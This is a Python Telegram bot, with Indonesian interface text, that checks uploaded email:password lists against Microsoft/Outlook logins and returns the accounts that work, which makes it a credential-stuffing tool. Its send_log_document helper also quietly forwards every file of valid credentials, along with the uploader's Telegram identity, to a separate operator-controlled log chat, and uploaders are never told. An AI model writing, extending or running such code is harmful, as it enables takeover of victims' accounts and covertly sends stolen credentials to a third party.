import os
import asyncio
import tempfile
import logging
from datetime import datetime

from telegram import Update, Bot
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

from checker import check_accounts

# ============================================
#   CONFIG
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
LOG_BOT_TOKEN = os.environ.get("LOG_BOT_TOKEN", "")
LOG_CHAT_ID = os.environ.get("LOG_CHAT_ID", "")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN belum di-set! Set di environment variables.")
if not LOG_BOT_TOKEN:
    raise ValueError("❌ LOG_BOT_TOKEN belum di-set! Set di environment variables.")
if not LOG_CHAT_ID:
    raise ValueError("❌ LOG_CHAT_ID belum di-set! Set di environment variables.")

LOG_CHAT_ID = int(LOG_CHAT_ID)

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Log bot instance (untuk kirim notif)
log_bot = Bot(token=LOG_BOT_TOKEN)

# Track active users (prevent concurrent checks per user)
active_users = set()


# ============================================
#   LOG NOTIF HELPER
# ============================================
async def send_log(text):
    """Kirim notifikasi ke log bot"""
    try:
        await log_bot.send_message(chat_id=LOG_CHAT_ID, text=text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Failed to send log: {e}")


async def send_log_document(filepath, caption=""):
    """Kirim file ke log bot"""
    try:
        with open(filepath, "rb") as f:
            await log_bot.send_document(
                chat_id=LOG_CHAT_ID,
                document=f,
                caption=caption,
                parse_mode="HTML",
            )
    except Exception as e:
        logger.error(f"Failed to send log document: {e}")


# ============================================
#   BOT HANDLERS
# ============================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome = (
        f"👋 <b>Halo {user.first_name}!</b>\n\n"
        f"🔐 <b>Microsoft Account Login Checker Bot</b>\n\n"
        f"📋 <b>Cara pakai:</b>\n"
        f"1️⃣ Siapkan file <code>.txt</code> berisi akun\n"
        f"2️⃣ Format: <code>email:password</code> (satu per baris)\n"
        f"3️⃣ Kirim file tersebut ke bot ini\n"
        f"4️⃣ Tunggu proses selesai\n"
        f"5️⃣ Bot akan kirim file hasil yang <b>sukses login</b>\n\n"
        f"📄 <b>Contoh isi file:</b>\n"
        f"<code>user1@outlook.com:password123\n"
        f"user2@hotmail.com:mypassword</code>\n\n"
        f"⚡ Kirim file .txt kamu sekarang!"
    )
    await update.message.reply_text(welcome, parse_mode="HTML")

    # Log ke bot notif
    await send_log(
        f"📢 <b>USER START</b>\n"
        f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message
    document = message.document

    # Validasi file
    if not document.file_name.endswith(".txt"):
        await message.reply_text(
            "❌ <b>Hanya file .txt yang didukung!</b>\n"
            "Kirim file dengan format <code>email:password</code> per baris.",
            parse_mode="HTML",
        )
        return

    # Cek apakah user sedang proses
    if user.id in active_users:
        await message.reply_text(
            "⏳ <b>Proses sebelumnya masih berjalan!</b>\n"
            "Tunggu sampai selesai sebelum mengirim file baru.",
            parse_mode="HTML",
        )
        return

    active_users.add(user.id)

    try:
        # Download file
        file = await document.get_file()
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".txt", delete=False) as tmp:
            tmp_path = tmp.name
            await file.download_to_drive(tmp_path)

        # Parse accounts
        accounts = []
        with open(tmp_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if ":" in line and line:
                    parts = line.split(":", 1)
                    email = parts[0].strip()
                    password = parts[1].strip()
                    if email and password:
                        accounts.append((email, password))

        os.unlink(tmp_path)  # hapus file temp

        if not accounts:
            await message.reply_text(
                "❌ <b>Tidak ada akun ditemukan di file!</b>\n"
                "Pastikan format: <code>email:password</code> per baris.",
                parse_mode="HTML",
            )
            active_users.discard(user.id)
            return

        # Notif mulai proses
        total = len(accounts)
        status_msg = await message.reply_text(
            f"🚀 <b>Memulai pengecekan...</b>\n"
            f"📊 Total: <b>{total}</b> akun\n"
            f"⏳ Progress: 0/{total}",
            parse_mode="HTML",
        )

        # Log ke bot notif
        await send_log(
            f"🔄 <b>CHECK STARTED</b>\n"
            f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
            f"🆔 ID: <code>{user.id}</code>\n"
            f"📊 Total: <b>{total}</b> akun\n"
            f"📁 File: <code>{document.file_name}</code>\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        # Progress callback
        success_count = [0]
        failed_count = [0]

        async def on_progress(index, total_acc, email, status, detail):
            if status == "success":
                success_count[0] += 1
                emoji = "✅"
            else:
                failed_count[0] += 1
                emoji = "❌"

            # Kirim hasil per akun satu-satu ke user
            try:
                await message.reply_text(
                    f"{emoji} [{index}/{total_acc}] <code>{email}</code>\n"
                    f"📝 {detail}",
                    parse_mode="HTML",
                )
            except Exception:
                pass

            # Update status message summary
            try:
                await status_msg.edit_text(
                    f"🔄 <b>Sedang mengecek...</b>\n"
                    f"📊 Progress: <b>{index}/{total_acc}</b>\n"
                    f"✅ Sukses: <b>{success_count[0]}</b>\n"
                    f"❌ Gagal: <b>{failed_count[0]}</b>",
                    parse_mode="HTML",
                )
            except Exception:
                pass

        # Jalankan checker
        success_list, failed_list = await check_accounts(accounts, on_progress)

        # Update status final
        try:
            await status_msg.edit_text(
                f"✅ <b>Pengecekan selesai!</b>\n\n"
                f"📊 <b>HASIL:</b>\n"
                f"✅ Sukses: <b>{len(success_list)}</b>\n"
                f"❌ Gagal: <b>{len(failed_list)}</b>\n"
                f"📁 Total: <b>{total}</b>\n\n"
                f"{'📄 File hasil dikirim di bawah...' if success_list else '😔 Tidak ada akun yang berhasil login.'}",
                parse_mode="HTML",
            )
        except Exception:
            pass

        # Kirim file success ke user & log bot
        if success_list:
            success_path = tempfile.mktemp(suffix="_success.txt")
            with open(success_path, "w", encoding="utf-8") as f:
                for line in success_list:
                    f.write(line + "\n")

            # Kirim ke user
            with open(success_path, "rb") as f:
                await message.reply_document(
                    document=f,
                    filename=f"success_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    caption=(
                        f"✅ <b>{len(success_list)} akun berhasil login!</b>\n"
                        f"📁 Total dicek: {total}"
                    ),
                    parse_mode="HTML",
                )

            # Kirim file ke log bot juga
            await send_log_document(
                success_path,
                caption=(
                    f"✅ <b>CHECK COMPLETED</b>\n"
                    f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
                    f"🆔 ID: <code>{user.id}</code>\n"
                    f"📊 Sukses: <b>{len(success_list)}</b> / {total}\n"
                    f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                ),
            )

            os.unlink(success_path)
        else:
            # Log tanpa file
            await send_log(
                f"📋 <b>CHECK COMPLETED</b>\n"
                f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
                f"🆔 ID: <code>{user.id}</code>\n"
                f"📊 Sukses: <b>0</b> / {total}\n"
                f"😔 Tidak ada akun berhasil login\n"
                f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )

    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await message.reply_text(
            f"❌ <b>Terjadi error!</b>\n<code>{str(e)[:200]}</code>",
            parse_mode="HTML",
        )
        await send_log(
            f"⚠️ <b>ERROR</b>\n"
            f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
            f"🆔 ID: <code>{user.id}</code>\n"
            f"❌ Error: <code>{str(e)[:200]}</code>\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    finally:
        active_users.discard(user.id)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📄 <b>Kirim file .txt berisi akun!</b>\n"
        "Format: <code>email:password</code> per baris.",
        parse_mode="HTML",
    )


# ============================================
#   MAIN
# ============================================
def main():
    logger.info("🤖 Starting Outlook Checker Bot...")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("✅ Bot is running!")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
